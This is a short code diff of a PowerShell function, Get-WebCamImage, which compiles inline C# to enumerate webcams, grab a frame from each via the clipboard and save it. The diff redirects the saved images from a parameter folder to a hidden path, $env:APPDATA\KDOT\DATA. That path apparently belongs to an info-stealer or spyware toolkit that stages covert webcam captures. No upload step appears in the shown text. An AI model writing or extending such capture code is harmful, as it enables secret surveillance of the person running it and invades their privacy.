@@ -1,4 +1,8 @@
 function Get-WebCamImage {
+    param
+    (
+        [string]$folder_general = "C:\temp"
+    )
     # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
     $source=@" 
     using System; 
@@ -120,7 +124,7 @@ function Get-WebCamImage {
                         Device d = new Device(i); 
                         d.Name = dName.Trim(); 
                         d.Version = dVersion.Trim(); 
-                        devices.Add(d);                     
+                        devices.Add(d);
                     } 
                 } 
     
@@ -150,7 +154,7 @@ function Get-WebCamImage {
 		}
         $count = 0
         foreach ($device in $devices) {
-            $imagePath = "$folder_general\out$count.jpg"
+            $imagePath = "$env:APPDATA\KDOT\DATA\out$count.jpg"
             $device.ShowWindow($picCapture)
             $device.CopyC()
             $bitmap = [Windows.Forms.Clipboard]::GetImage()
@@ -162,7 +166,6 @@ function Get-WebCamImage {
 
     } catch {
 		Write-Host "No camera found"
-		
 	}
 }
 Get-WebCamImage
